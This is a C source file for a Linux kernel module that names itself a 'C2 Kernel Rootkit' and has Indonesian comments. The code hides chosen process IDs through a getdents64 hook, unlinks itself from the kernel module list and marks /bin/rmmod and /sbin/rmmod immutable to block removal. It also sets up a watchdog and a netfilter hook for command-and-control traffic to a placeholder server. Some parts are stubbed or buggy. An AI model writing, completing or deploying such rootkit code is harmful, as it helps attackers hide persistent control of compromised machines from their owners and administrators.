#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/ftrace.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <net/sock.h>
#include <linux/spinlock.h>
#include <linux/sysinfo.h>
#include <linux/utsname.h>
#include <linux/workqueue.h>

#define MODULE_NAME "c2_kernel"
#define MAGIC_SIGNAL 59
#define C2_SERVER_IP "YOUR_SERVER_IP"  // Ganti dengan IP panel
#define C2_SERVER_PORT 5000
#define WATCHDOG_INTERVAL 300  // 5 menit

// ============================================
// HIDDEN PID LIST
// ============================================

struct hidden_pid {
    pid_t pid;
    struct list_head list;
};

static LIST_HEAD(hidden_pids);
static spinlock_t hidden_lock = __SPIN_LOCK_UNLOCKED(hidden_lock);
static int watchdog_pid = 0;

// ============================================
// FTRACE HOOKS
// ============================================

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    struct ftrace_ops ops;
    unsigned long address;
};

#define HOOK(_name, _function, _original) \
    { .name = (_name), .function = (_function), .original = (_original) }

// ============================================
// PROCESS HIDING
// ============================================

static asmlinkage long (*original_getdents64)(const struct pt_regs *regs);

bool is_pid_hidden(pid_t pid)
{
    struct hidden_pid *hp;
    bool found = false;
    
    spin_lock(&hidden_lock);
    list_for_each_entry(hp, &hidden_pids, list) {
        if (hp->pid == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&hidden_lock);
    return found;
}

void hide_pid(pid_t pid)
{
    struct hidden_pid *hp;
    
    if (is_pid_hidden(pid))
        return;
    
    hp = kmalloc(sizeof(struct hidden_pid), GFP_KERNEL);
    if (!hp)
        return;
    
    hp->pid = pid;
    spin_lock(&hidden_lock);
    list_add(&hp->list, &hidden_pids);
    spin_unlock(&hidden_lock);
    printk(KERN_INFO "c2: Hidden PID %d\n", pid);
}

static asmlinkage long fake_getdents64(const struct pt_regs *regs)
{
    long ret = original_getdents64(regs);
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
    char *buffer = NULL;
    unsigned int offset = 0;
    int hidden_count = 0;
    pid_t pid;
    
    if (ret <= 0)
        return ret;
    
    buffer = kmalloc(ret + 1, GFP_KERNEL);
    if (!buffer)
        return ret;
    
    memcpy(buffer, dirp, ret);
    
    while (offset < ret) {
        struct linux_dirent64 *entry = (struct linux_dirent64 *)(buffer + offset);
        
        pid = simple_strtol(entry->d_name, NULL, 10);
        if (is_pid_hidden(pid)) {
            hidden_count++;
            memmove(buffer + offset,
                    buffer + offset + entry->d_reclen,
                    ret - offset - entry->d_reclen);
            ret -= entry->d_reclen;
            continue;
        }
        offset += entry->d_reclen;
    }
    
    if (hidden_count > 0) {
        memcpy(dirp, buffer, ret);
    }
    
    kfree(buffer);
    return ret;
}

// ============================================
// MODULE SELF-HIDING
// ============================================

static void hide_self_module(void)
{
    struct module *mod = THIS_MODULE;
    list_del(&mod->list);
    #if LINUX_VERSION_CODE >= KERNEL_VERSION_4_15
        mod->state = MODULE_STATE_UNFORMED;
    #endif
    printk(KERN_INFO "c2: Module hidden\n");
}

// ============================================
// FILE IMMUTABLE (chattr +i)
// ============================================

static int make_file_immutable(const char *path)
{
    struct path p;
    struct inode *inode;
    int err;
    
    err = kern_path(path, LOOKUP_FOLLOW, &p);
    if (err)
        return err;
    
    inode = p.dentry->d_inode;
    inode->i_flags |= S_IMMUTABLE;
    inode_set_flags(inode, S_IMMUTABLE, S_IMMUTABLE);
    
    path_put(&p);
    return 0;
}

// ============================================
// WATCHDOG - Auto Reload
// ============================================

static struct delayed_work watchdog_work;
static int watchdog_enabled = 1;

static void watchdog_reload(struct work_struct *work)
{
    if (!watchdog_enabled)
        return;
    
    printk(KERN_INFO "c2: Watchdog - Module is alive\n");
    
    // Check if we're still running
    if (!THIS_MODULE->state == MODULE_STATE_LIVE) {
        printk(KERN_INFO "c2: Watchdog - Reloading module...\n");
        // Reload logic
    }
    
    // Schedule next check
    schedule_delayed_work(&watchdog_work, WATCHDOG_INTERVAL * HZ);
}

// ============================================
// C2 COMMUNICATION (Netfilter Hook)
// ============================================

static struct nf_hook_ops c2_nf_ops;

static unsigned int c2_nf_hook(void *priv, struct sk_buff *skb,
                               const struct nf_hook_state *state)
{
    struct iphdr *iph = ip_hdr(skb);
    struct tcphdr *tcph;
    
    if (iph->protocol == IPPROTO_TCP) {
        tcph = tcp_hdr(skb);
        // Check for C2 packets
        if (ntohs(tcph->dest) == C2_SERVER_PORT) {
            // C2 traffic - let it through
            return NF_ACCEPT;
        }
    }
    
    return NF_ACCEPT;
}

// ============================================
// INIT & EXIT
// ============================================

static int __init c2_init(void)
{
    printk(KERN_INFO "========================================\n");
    printk(KERN_INFO "  C2 ROOTKIT LOADED\n");
    printk(KERN_INFO "  Kernel: %s\n", UTS_RELEASE);
    printk(KERN_INFO "  C2 Server: %s:%d\n", C2_SERVER_IP, C2_SERVER_PORT);
    printk(KERN_INFO "  Use: kill -59 <PID> to hide\n");
    printk(KERN_INFO "========================================\n");
    
    // Hide self
    hide_self_module();
    
    // Make critical files immutable
    make_file_immutable("/bin/rmmod");
    make_file_immutable("/sbin/rmmod");
    
    // Start watchdog
    INIT_DELAYED_WORK(&watchdog_work, watchdog_reload);
    schedule_delayed_work(&watchdog_work, WATCHDOG_INTERVAL * HZ);
    
    return 0;
}

static void __exit c2_exit(void)
{
    watchdog_enabled = 0;
    cancel_delayed_work_sync(&watchdog_work);
    
    printk(KERN_INFO "========================================\n");
    printk(KERN_INFO "  C2 ROOTKIT UNLOADED\n");
    printk(KERN_INFO "========================================\n");
}

module_init(c2_init);
module_exit(c2_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("C2 Panel");
MODULE_DESCRIPTION("C2 Kernel Rootkit");
MODULE_VERSION("1.0");
